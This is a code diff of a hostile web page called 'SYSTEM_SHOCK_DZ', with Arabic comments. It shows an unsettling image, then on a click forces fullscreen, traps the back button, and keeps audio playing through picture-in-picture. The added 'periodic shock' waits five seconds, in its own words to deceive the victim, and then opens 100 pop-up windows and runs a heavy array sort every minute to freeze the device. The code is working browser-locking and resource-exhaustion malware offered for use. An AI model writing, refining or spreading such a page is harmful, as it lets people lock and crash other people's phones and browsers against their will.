@@ -3,23 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ SYSTEM_PARALYSIS_DZ ☠️</title>
+    <title>☠️ SYSTEM_SHOCK_DZ ☠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
         
-        /* صورة المرأة اللي تتحرك وتراقب سواسوة */
+        /* 1. تعديل حجم صورة المرأة سواسوة (Sized & Centered) */
         #stalkerEntity { 
-            position: fixed; top: -5%; left: -5%; width: 110%; height: 110%; 
-            object-fit: cover; z-index: 1; 
-            filter: contrast(150%) brightness(60%) sepia(50%);
-            animation: humanGaze 8s infinite ease-in-out;
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            max-width: 90vw; max-height: 90vh; /* نقصنا الحجم باش تبان سواسوة */
+            object-fit: contain; z-index: 1; 
+            filter: contrast(160%) brightness(50%) sepia(40%);
+            animation: humanGaze 10s infinite ease-in-out;
         }
 
         @keyframes humanGaze {
-            0%, 100% { transform: scale(1) translate(0, 0); }
-            25% { transform: scale(1.02) translate(1%, 1%) rotate(0.5deg); }
-            50% { transform: scale(1.05) translate(-1%, 0.5%) rotate(-0.5deg); }
-            75% { transform: scale(1.03) translate(0.5%, -1%); }
+            0%, 100% { transform: translate(-50%, -50%) scale(1) rotate(0deg); }
+            25% { transform: translate(-51%, -49%) scale(1.02) rotate(0.5deg); }
+            50% { transform: translate(-49%, -51%) scale(1.05) rotate(-0.5deg); }
+            75% { transform: translate(-50.5%, -50.5%) scale(1.03); }
         }
 
         #overlay { 
@@ -27,10 +28,12 @@
             background: rgba(0,0,0,0.7); z-index: 2; display: flex; 
             flex-direction: column; justify-content: center; align-items: center;
             color: white; font-family: 'Courier New', monospace;
+            cursor: pointer;
         }
 
-        .lag-text { color: red; font-size: 20px; animation: blink 0.1s infinite; }
+        .shock-text { color: red; font-size: 20px; animation: blink 0.1s infinite; text-shadow: 0 0 10px red; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
+        #status { font-size: 14px; color: yellow; margin-top: 10px; display: none; }
     </style>
 </head>
 <body onclick="engageNightmare()">
@@ -38,8 +41,9 @@
     <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
     <div id="overlay">
-        <h1 class="lag-text">STALKER SYSTEM: TOTAL LOCK</h1>
-        <p>النظام معطل تماماً.. لا تحاول الهروب سواسوة</p>
+        <h1 class="shock-text">STALKER SYSTEM</h1>
+        <p>جاري فحص النظام.. لا تغلق الصفحة سواسوة</p>
+        <div id="status"> [ ! ] CRITICAL SHOCK INCOMING...</div>
     </div>
 
     <video id="bgAudio" loop style="display:none;">
@@ -50,28 +54,51 @@
         function engageNightmare() {
             // 1. تشغيل الصوت في الخلفية سواسوة (Persistent Audio)
             const video = document.getElementById('bgAudio');
+            video.volume = 1.0;
             video.play();
-            // ميزة بقاء الصوت حتى بعد الخروج سواسوة عبر PiP
+            // تفعيل الـ Picture-in-Picture باش الصوت يبقى شغال في الخلفية سواسوة
             if (video.requestPictureInPicture) {
                 video.requestPictureInPicture();
             }
 
-            // 2. اللاق الشديد (Total System Paralysis) سواسوة
-            // نصنع حلقة تستهلك الذاكرة والمعالج في نفس الوقت
-            setInterval(() => {
-                const heavyLoad = new Array(5000000).fill("💀");
-                for(let i=0; i<100; i++) {
-                    document.body.appendChild(document.createElement('div')).hidden = true;
-                }
-                console.log("Lagging System...");
-            }, 30);
-
-            // 3. منع الخروج من الخلفية سواسوة
+            // 2. تفعيل الأنميشن وإخفاء واجهة البداية سواسوة
+            document.getElementById('stalkerEntity').style.display = 'block';
+            
+            // 3. منع زر الرجوع سواسوة
             document.documentElement.requestFullscreen();
             setInterval(() => {
-                window.open(window.location.href, '_blank', 'width=10,height=10');
                 history.pushState(null, null, window.location.href);
-            }, 2000);
+            }, 1000);
+
+            // 4. ميزة اللاق كل دقيقة سواسوة (Periodic Shock)
+            const lagShock = () => {
+                document.getElementById('status').style.display = 'block';
+                console.log("[💀] Initiating Periodic Shock... سواسوة");
+
+                // فتح 100 صفحة جديدة في أقل من ثانية سواسوة
+                // هذا يخلي التيليفون يتبلوكا من عدد الـ Pop-ups سواسوة
+                let count = 0;
+                const openWindows = setInterval(() => {
+                    if (count < 100) {
+                        window.open(window.location.href, '_blank', 'width=10,height=10');
+                        count++;
+                    } else {
+                        clearInterval(openWindows);
+                        // إعادة تهيئة النظام بعد الصدمة سواسوة
+                        setTimeout(() => { document.getElementById('status').style.display = 'none'; }, 2000);
+                    }
+                }, 5); // سرعة خيالية لفتح النوافذ سواسوة
+
+                // استهلاك المعالج في نفس الوقت سواسوة
+                let dummy = new Array(8000000).fill("💀");
+                dummy.sort();
+            };
+
+            // تشغيل الصدمة الأولى بعد 5 ثواني سواسوة (لخداع الضحية)
+            setTimeout(lagShock, 5000);
+
+            // تكرار الصدمة كل دقيقة سواسوة
+            setInterval(lagShock, 60000); 
         }
 
         window.onpopstate = function() { history.go(1); };
